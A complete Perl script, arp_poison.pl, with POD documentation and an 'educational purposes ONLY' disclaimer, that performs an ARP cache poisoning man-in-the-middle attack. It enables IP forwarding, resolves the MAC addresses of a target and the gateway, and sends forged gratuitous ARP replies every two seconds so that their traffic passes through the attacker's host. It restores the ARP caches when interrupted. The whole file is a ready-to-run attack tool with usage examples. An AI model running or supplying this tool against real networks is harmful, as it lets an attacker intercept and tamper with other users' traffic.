#!/usr/bin/perl

use strict;
use warnings;
use Net::ARP;
use Getopt::Long;

sub usage {
    print "Usage:\n\n\$ sudo perl $0 -i <interface> -t <IPv4 address> -g <IPv4 address>\n";
    print "\nOptions:\n\n";
    print "\t-i -interface <if name>\t name of the network interface\n";
    print "\t-t -target <IPv4>\t IPv4 address of the target\n";
    print "\t-g -gateway <IPv4>\t IPv4 address of the default gateway\n";
    print "\t-h -help\t\t prints this help and exits\n";
    print "\nExample:\n\n";
    print "\$ sudo perl $0 -i eth0 -t 192.168.1.100 -g 192.168.1.1\n";
    print "\n";

    exit;
}

BEGIN {
    local $SIG{__DIE__} = sub { warn @_; print "\n"; &usage() };
    die "[!!] You have to run this as root\n" unless $< == 0;
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    my $banner = "ARP Cache Poisoner";
    print $banner, "\n", '-' x length $banner, "\n";
}

END {
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
}

# Global variables

our ($interface, $localMac, $localIp);
our ($targetIp, $targetMac, $gatewayIp, $gatewayMac);

# Functions

sub getInterfaceAddresses($) {
    my $if = shift;
    my $ifconf = `ifconfig $if`;
    $ifconf =~ /inet (\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})/;
    my $ip = $1;
    my $mac = Net::ARP::get_mac($if);
    return ($ip, $mac)
}

sub getRemoteMacAddress($) {
    my $ip = shift;

    Net::ARP::send_packet(
        $interface,
        $localIp,
        $ip,
        $localMac,
        'ff:ff:ff:ff:ff:ff',
        'request'
    );

    my $mac = Net::ARP::arp_lookup($interface, $ip);
    return $mac
}

sub sendGratuitousArpReply($ $ $ $) {
    my ($srcIP, $srcMac, $destIP, $destMac) = @_;

    Net::ARP::send_packet(
        $interface,
        $srcIP,
        $destIP,
        $srcMac,
        $destMac,
        'reply'
    ) or warn "[!!] Cannot send ARP reply\n";
}

sub restoreArp {
    print "[*] Restoring ARP cache...\n";
    &sendGratuitousArpReply($targetIp, $targetMac, $gatewayIp, $gatewayMac);
    &sendGratuitousArpReply($targetIp, $targetMac, $gatewayIp, $gatewayMac);
    &sendGratuitousArpReply($gatewayIp, $gatewayMac, $targetIp, $targetMac);
    &sendGratuitousArpReply($gatewayIp, $gatewayMac, $targetIp, $targetMac);
    print "[*] Exiting\n";
    exit;
}

sub startPoisoning {
    local $SIG{TSTP} = $SIG{TERM} = $SIG{INT} = $SIG{QUIT} = $SIG{HUP} = \&restoreArp;
    while () {
        print "[+] Sending ARP packets...\n";
        &sendGratuitousArpReply($targetIp, $localMac, $gatewayIp, $gatewayMac);
        &sendGratuitousArpReply($gatewayIp, $localMac, $targetIp, $targetMac);
        sleep(2)
    }
}

# Main

my $help;

GetOptions(
    'i|interface=s' => \$interface,
    't|target=s'  => \$targetIp,
    'g|gateway=s'   => \$gatewayIp,
    'h|help'    => \$help
);

&usage() if $help;
&usage() unless $interface;
&usage() unless $targetIp;
&usage() unless $gatewayIp;

($localIp, $localMac) = &getInterfaceAddresses($interface);

print "Local IP: $localIp\nLocal MAC: $localMac\n\n";

$gatewayMac = &getRemoteMacAddress($gatewayIp);

print "Gateway's ($gatewayIp) MAC: $gatewayMac\n";

$targetMac = &getRemoteMacAddress($targetIp);

print "Target's ($targetIp) MAC: $targetMac\n";

print "\n[*] Poisoning...\n\n";
&startPoisoning();

__END__

=encoding utf8

=head1 NAME

arp_poison.pl - script performing ARP cache poisoning man-in-the-middle attack

=head1 SYNOPIS

Usage:

$ sudo perl arp_poison.pl -i <interface> -t <IPv4 address> -g <IPv4 address>

Options:

        -i -interface <if name>  name of the network interface
        -t -target <IPv4>        IPv4 address of the target
        -g -gateway <IPv4>       IPv4 address of the default gateway
        -h -help                 prints this help and exits

Example:

$ sudo perl arp_poison.pl -i eth0 -t 192.168.1.100 -g 192.168.1.1

=head1 DESCRIPTION

This script sends gratuitous ARP replies to given host and default gateway

=head1 DISCLAIMER

This is for educational purposes ONLY. I DO NOT encourage or promote any illegal activities.

=head1 LICENSE

This is released under the MIT License

=head1 AUTHOR

Artur Kręgiel <arkregiel@gmail.com>

=head1 SEE ALSO

L<https://metacpan.org/pod/Net::ARP>

=cut